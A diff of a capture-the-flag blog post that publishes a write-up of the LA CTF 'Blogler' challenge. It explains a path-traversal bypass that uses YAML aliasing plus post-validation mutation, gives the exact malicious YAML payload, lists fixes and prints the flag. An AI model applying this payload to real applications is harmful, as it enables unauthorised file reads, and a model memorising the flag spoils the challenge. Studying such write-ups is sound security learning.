@@ -1,14 +1,231 @@
 ---
 title: "Blogler"
 date: 2026-02-08
-releaseDate: "2099-01-01"
+tags: ["yaml", "path-traversal", "aliasing", "lfi"]
+topics: ["web"]
+summary: "Early access — password required"
+releaseDate: "2026-02-09"
 ctfs: ["lactf-26"]
 difficulty: medium
 draft: false
-
-showTableOfContents: false
-excludeFromSearch: true
-summary: "Early access — password required"
 ---
 
-{{< encrypted data="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" hash="451da89da8060807914012b7cab71f70a28c9cbe9cfa603f8a74fb2b601a9a8d" >}}
+> They call me the blogler.
+
+---
+
+A blogging platform built with Flask. Users register, write blog posts in Markdown, and edit their blog's YAML configuration through a Monaco editor. The flag sits at `/flag` on the server.
+
+The app has explicit path traversal protection. It checks for `../` in filenames, blocks absolute paths, and verifies that resolved paths stay inside the blogs directory. Breaking through requires finding a way to mutate a filename *after* validation has already passed.
+
+---
+
+## Application overview
+
+The app has two main features: uploading blog posts (Markdown files saved to disk) and editing a YAML config that controls how your blog is served.
+
+When you visit `/blog/<username>`, the server reads each blog entry's `name` field and opens that file from the blogs directory:
+
+```python
+@app.get("/blog/<string:username>")
+def serve_blog(username):
+    if username not in users:
+        return "username does not exist", 404
+    blogs = [
+        {"title": blog["title"], "content": mistune.html((blog_path / blog["name"]).read_text())}
+        for blog in users[username]["blogs"]
+    ]
+    return render_template("blog.html", blogs=blogs, name=users[username]["user"]["name"])
+```
+
+If we can control `blog["name"]` to be something like `../../flag`, the server will read `/flag` instead of a file inside `blogs/`. But there's validation standing in the way.
+
+---
+
+## The validation
+
+When you submit a new YAML config, `validate_conf` checks every blog entry's `name` field:
+
+```python
+def validate_conf(old_cfg: dict, uploaded_conf: str) -> dict | str:
+    try:
+        conf = yaml.safe_load(uploaded_conf)
+
+        for i, blog in enumerate(conf["blogs"]):
+            if not isinstance(blog.get("title"), str):
+                return f"please provide a 'title' to the {i+1}th blog"
+
+            # no lfi
+            file_name = blog["name"]
+            assert isinstance(file_name, str)
+            file_path = (blog_path / file_name).resolve()
+            if "../" in file_name or file_name.startswith("/") or not file_path.is_relative_to(blog_path):
+                return f"file path {file_name!r} is a hacking attempt. this incident will be reported"
+
+        if not isinstance(conf.get("user"), dict):
+            conf["user"] = dict()
+
+        conf["user"]["name"] = display_name(conf["user"].get("name", old_cfg["user"]["name"]))
+        conf["user"]["password"] = conf["user"].get("password", old_cfg["user"]["password"])
+        if not isinstance(conf["user"]["password"], str):
+            return "provide a valid password bro"
+        return conf
+    except Exception as e:
+        return f"exception - {e}"
+```
+
+Three checks block direct path traversal on each blog's `name`:
+
+1. `"../" in file_name` rejects any filename containing the literal substring `../`
+2. `file_name.startswith("/")` rejects absolute paths
+3. `not file_path.is_relative_to(blog_path)` resolves the path and checks it stays under `blogs/`
+
+These are solid. There's no way to pass a string like `../../flag` through this gauntlet. But notice what happens *after* the loop: there's a call to `display_name()` that modifies `conf["user"]["name"]`. That's the next piece of the puzzle.
+
+---
+
+## The display_name function
+
+```python
+def display_name(username: str) -> str:
+    return "".join(p.capitalize() for p in username.split("_"))
+```
+
+This is meant to create a display-friendly version of a username. It splits on underscores, capitalizes each part, and joins them back together. For example:
+
+| Input | Split parts | After capitalize | Joined |
+|-------|-------------|------------------|--------|
+| `john_doe` | `["john", "doe"]` | `["John", "Doe"]` | `JohnDoe` |
+| `hello_world` | `["hello", "world"]` | `["Hello", "World"]` | `HelloWorld` |
+
+Seems harmless. But look at what happens with carefully chosen inputs:
+
+| Input | Split parts | After capitalize | Joined |
+|-------|-------------|------------------|--------|
+| `._._` | `[".", ".", ""]` | `[".", ".", ""]` | `..` |
+
+The string `._._` becomes `..` after processing. The `capitalize()` call on `.` returns `.` (there's nothing to capitalize), and the underscores disappear.
+
+This means `display_name` can produce path traversal sequences from inputs that don't contain `../`.
+
+---
+
+## YAML anchors and aliases
+
+Here's the core trick. YAML supports **anchors** (`&name`) and **aliases** (`*name`), which create shared references to the same object. This is a feature for avoiding repetition in config files:
+
+```yaml
+defaults: &defaults
+  timeout: 30
+  retries: 3
+
+server_a:
+  <<: *defaults
+  host: a.example.com
+
+server_b:
+  <<: *defaults
+  host: b.example.com
+```
+
+The critical detail: anchors and aliases don't create copies. They create **references to the same object in memory**. In Python terms, after `yaml.safe_load`:
+
+```python
+data["defaults"] is data["server_a"]  # same dict object
+```
+
+This means mutating one mutates the other. And that's the key to bypassing validation.
+
+---
+
+## Putting it together
+
+The validation loop checks `conf["blogs"][0]["name"]`, and then later the code does:
+
+```python
+conf["user"]["name"] = display_name(conf["user"].get("name", ...))
+```
+
+If `conf["user"]` and `conf["blogs"][0]` are **the same dict object** (via a YAML alias), then writing to `conf["user"]["name"]` also overwrites `conf["blogs"][0]["name"]`.
+
+The attack config:
+
+```yaml
+blogs:
+  - &ref
+    title: "flag"
+    name: "._._/._._/flag"
+user: *ref
+```
+
+Here's the step-by-step execution:
+
+1. **YAML parsing**: `yaml.safe_load` creates one dict `{"title": "flag", "name": "._._/._._/flag"}`. Both `blogs[0]` and `user` point to this same dict.
+
+2. **Validation loop**: The code checks `blogs[0]["name"]` which is `"._._/._._/flag"`. This passes all three checks:
+   - `"../" in "._._/._._/flag"` → `False` (no `../` substring)
+   - `"._._/._._/flag".startswith("/")` → `False`
+   - The resolved path stays under `blog_path` (since there's no actual `..` yet)
+
+3. **The mutation**: After the loop, the code runs:
+   ```python
+   conf["user"]["name"] = display_name(conf["user"].get("name", ...))
+   ```
+   `conf["user"]` is the *same dict* as `blogs[0]`, so `conf["user"].get("name")` returns `"._._/._._/flag"`. Then `display_name` processes it:
+   ```python
+   display_name("._._/._._/flag")
+   # split("_") → [".", ".", "/.", ".", "/flag"]
+   # capitalize each → [".", ".", "/.", ".", "/flag"]
+   # join → "../../flag"
+   ```
+   Why does `capitalize()` leave everything unchanged? It uppercases only the first character and lowercases the rest. The first character in each part is either `.` or `/`, and non-alphabetic characters have no uppercase form, so they pass through. The remaining letters (`flag`) are already lowercase, so lowercasing them is a no-op.
+
+   The concatenation builds up `../../flag` piece by piece:
+
+4. **This overwrites `blogs[0]["name"]`** to `"../../flag"`. Validation already passed, so it's too late to catch it.
+
+5. **Reading the blog**: When someone visits `/blog/<username>`, the server does:
+   ```python
+   (blog_path / blog["name"]).read_text()
+   ```
+   Which resolves `blogs/../../flag` → `/flag`, and we get the flag.
+
+---
+
+## Exploit
+
+1. **Register** an account with any username and password
+
+2. **Submit the malicious YAML config** via the config editor:
+   ```yaml
+   blogs:
+     - &ref
+       title: "flag"
+       name: "._._/._._/flag"
+   user: *ref
+   ```
+
+3. **Visit** `/blog/<your_username>`. The server reads `/flag` and renders it as your blog post
+
+You can do all of this through the web UI. Paste the YAML into the config editor on the left side, hit "Update Config", then click the "blog" link to view your page.
+
+---
+
+## Why the fix is hard
+
+The root cause isn't just the `display_name` function or the YAML aliases individually, it's the combination. The code validates a data structure, then mutates part of it, not realizing that YAML aliasing has linked that part to something already validated.
+
+Defenses that would prevent this:
+
+- **Deep-copy the parsed YAML** before processing, breaking shared references
+- **Validate after all mutations**, not before
+- **Don't mutate the config in-place**, build a new dict for the validated output
+
+---
+
+## Flag
+
+```
+lactf{7m_g0nn4_bl0g_y0u}
+```
+
